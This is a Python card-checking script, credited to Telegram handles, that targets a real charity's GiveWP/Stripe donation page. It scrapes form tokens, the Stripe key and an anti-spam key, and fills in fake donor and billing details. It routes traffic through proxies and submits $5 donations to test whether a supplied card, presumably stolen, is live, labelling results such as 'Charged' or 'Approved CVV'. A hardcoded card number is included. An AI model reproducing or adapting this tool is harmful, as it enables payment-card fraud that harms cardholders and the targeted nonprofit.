#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GiveWP Stripe $5 charge"""
#t.me/zenithdevxd
#t.me/npnbit4

import random, re, string, sys, time
import urllib3
import requests

urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36")

DONATE_URL = "https://ourkidsatheart.com/donate-now-austin-chapter/"
FORM_URL = "https://ourkidsatheart.com/donate-now-austin-chapter/?payment-mode=stripe"

#zenithdevxd
def random_details():
    first_names = ["Ahmed", "Mohamed", "Sarah", "Omar", "Hannah", "Yara", "Khaled", "Lina"]
    last_names = ["Khalil", "Smith", "Williams", "Garcia", "Martinez", "Brown"]
    letters = "".join(random.choices(string.ascii_lowercase, k=20))
    digits = f"{random.randint(0,9999):04d}"
    return {
        "first": random.choice(first_names),
        "last": random.choice(last_names),
        "email": f"{letters}{digits}@gmail.com",
    }


def run(card_str, proxy=None):
    parts = card_str.strip().split("|")
    if len(parts) != 4:
        return {"Status": "Error", "Response": "Format: PAN|MM|YY|CVV"}
    number, month, year, cvv = parts
    if len(year) == 4:
        year = year[-2:]
    month = month.zfill(2)

    d = random_details()
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA})

    if proxy:
        p = proxy.split(":")
        if len(p) == 4:
            url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        elif len(p) == 2:
            url = f"http://{p[0]}:{p[1]}"
        else:
            url = None
        if url:
            s.proxies = {"http": url, "https": url}

    # 1. fetch donation form
    r = s.get(DONATE_URL, timeout=20)
    html = r.text
    print(f"[*] form len={len(html)}")

    def grab(pat):
        m = re.search(pat, html)
        return m.group(1) if m else ""

    form_id  = grab(r'name="give-form-id" value="([^"]+)"')
    prefix   = grab(r'name="give-form-id-prefix" value="([^"]+)"')
    form_hash = grab(r'name="give-form-hash" value="([^"]+)"')
    register = grab(r'name="give-form-user-register-hash" value="([^"]+)"')
    account  = grab(r'data-account="([^"]+)"')
    pk_live  = grab(r'data-publishable-key="([^"]+)"')
    spam_key = grab(r'ZeroSpamDavidWalsh\s*=\s*\{[^}]*?"key"\s*:\s*"([^"]+)"')

    print(f"[*] form_id={form_id}")
    print(f"[*] prefix={prefix}")
    print(f"[*] hash={form_hash[:20]}...")
    print(f"[*] register={register[:20]}...")
    print(f"[*] account={account}")
    print(f"[*] pk={pk_live[:25]}...")
    print(f"[*] spam_key={spam_key[:15]}...")

    if not all([form_id, prefix, form_hash, register, account, pk_live]):
        return {"Status": "Error", "Response": "Could not extract required tokens"}

    # 2. create Stripe payment method
    guid = f"{random.randint(0,0xffffffff):08x}-{random.randint(0,0xffff):04x}-{random.randint(0,0xffff):04x}-{random.randint(0,0xffff):04x}-{random.randint(0,0xffffffffffff):012x}"
    muid = guid
    sid  = guid

    pm_data = {
        "type": "card",
        "billing_details[name]": f"{d['first']}+{d['last']}",
        "billing_details[email]": d["email"],
        "billing_details[address][line1]": "New york new states 1000",
        "billing_details[address][city]": "New york",
        "billing_details[address][state]": "NY",
        "billing_details[address][postal_code]": "10080",
        "billing_details[address][country]": "US",
        "card[number]": number,
        "card[cvc]": cvv,
        "card[exp_month]": month,
        "card[exp_year]": year,
        "guid": guid, "muid": muid, "sid": sid,
        "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; split-card-element",
        "referrer": "https://ourkidsatheart.com",
        "time_on_page": "1303230",
        "key": pk_live,
        "_stripe_account": account,
    }

    r = s.post(
        "https://api.stripe.com/v1/payment_methods",
        data=pm_data,
        headers={
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        },
        timeout=20,
    )
    try:
        sj = r.json()
    except Exception:
        return {"Status": "Error", "Response": f"Stripe non-JSON: {r.text[:200]}"}

    if "id" not in sj:
        err = sj.get("error", {}).get("message", "tokenization failed")
        return {"Status": "Declined ❌", "Response": f"Stripe: {err}"}

    pm_id = sj["id"]
    print(f"[*] pm={pm_id}")

    # 3. submit donation
    donation = {
        "give-honeypot": "",
        "give-form-id-prefix": prefix,
        "give-form-id": form_id,
        "give-form-title": "Donate - Austin",
        "give-current-url": DONATE_URL,
        "give-form-url": DONATE_URL,
        "give-form-minimum": "5.00",
        "give-form-maximum": "999999.99",
        "give-form-hash": form_hash,
        "give-price-id": "custom",
        "give-recurring-logged-in-only": "",
        "give-logged-in-only": "1",
        "_give_is_donation_recurring": "0",
        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
        "give-amount": "5.00",
        "give-recurring-period-donors-choice": "day",
        "give_referral": d["first"],
        "give_stripe_payment_method": pm_id,
        "payment-mode": "stripe",
        "give_first": d["first"],
        "give_last": d["last"],
        "give_email": d["email"],
        "give-form-user-register-hash": register,
        "give-purchase-var": "needs-to-register",
        "card_name": d["first"],
        "billing_country": "US",
        "card_address": "New york new states 1000",
        "card_address_2": "",
        "card_city": "New york",
        "card_state": "NY",
        "card_zip": "10080",
        "give_action": "purchase",
        "give-gateway": "stripe",
        "71MzG": "",
        "zerospam_david_walsh_key": spam_key,
    }

    r = s.post(
        f"{FORM_URL}&form-id={form_id}",
        data=donation,
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://ourkidsatheart.com",
            "Referer": DONATE_URL,
        },
        timeout=25,
    )
    body = r.text
    print(f"[*] donation resp len={len(body)}")

    low = body.lower()

    if "thank you for your donation" in low or "thank you" in low or "successfully" in low:
        return {"Status": "Charged ✅", "Response": "$5 donation successful"}
    if "requires_action" in low:
        return {"Status": "Approved 3DS ✅", "Response": "3DS required — card live"}

    m = re.search(r"<strong>Error</strong>:\s*(.*?)</p>", body, re.S)
    if m:
        err = re.sub(r"<[^>]+>", "", m.group(1)).strip()[:200]
        el = err.lower()
        if "insufficient" in el:
            return {"Status": "Approved CVV ✅", "Response": f"Insufficient funds — {err}"}
        if "cvv" in el or "security" in el:
            return {"Status": "Approved CCN ❎", "Response": f"CVV mismatch — {err}"}
        if "address" in el or "zip" in el:
            return {"Status": "Approved AVS ❎", "Response": f"AVS mismatch — {err}"}
        return {"Status": "Declined ❌", "Response": err}

    return {"Status": "Declined ❌", "Response": "Payment failed (no marker found)"}

#t.me/npnbit4
if __name__ == "__main__":
    print()
    print("=" * 60)
    print("  Stripe 5$ by t.me/zenithdevxd & t.me/npnbit4")
    print("=" * 60)
    print()
    card = input("Card [pan|mm|yy|cvv]: ").strip() or "4427422126880015|10|2026|126"
    proxy = input("Proxy host:port:user:pass (Enter to skip): ").strip() or None
    print()
    t0 = time.time()
    result = run(card, proxy)
    print()
    print("=" * 60)
    print(f"Status:   {result.get('Status')}")
    print(f"Response: {result.get('Response')}")
    print(f"Time:     {round(time.time()-t0, 2)}s")
    print("=" * 60)
#t.me/zenithdevxd 